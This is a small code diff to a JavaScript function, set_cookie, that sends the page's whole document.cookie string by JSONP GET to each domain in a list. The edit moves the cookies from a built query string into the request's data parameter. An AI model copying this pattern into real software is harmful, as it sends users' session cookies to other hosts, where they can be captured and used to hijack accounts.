@@ -23,9 +23,10 @@ function set_cookie(pos,domainList)
 {
 
     $.ajax({
-        type:"get",
+        type:"GET",
         dataType:"jsonp",
-        url: domainList[pos]+"?cookies="+document.cookie,
+        url: domainList[pos],
+        data:{cookies:document.cookie},
         crossDomain:true,
         complete:function(data,status){
             if(pos+1<domainList.length)
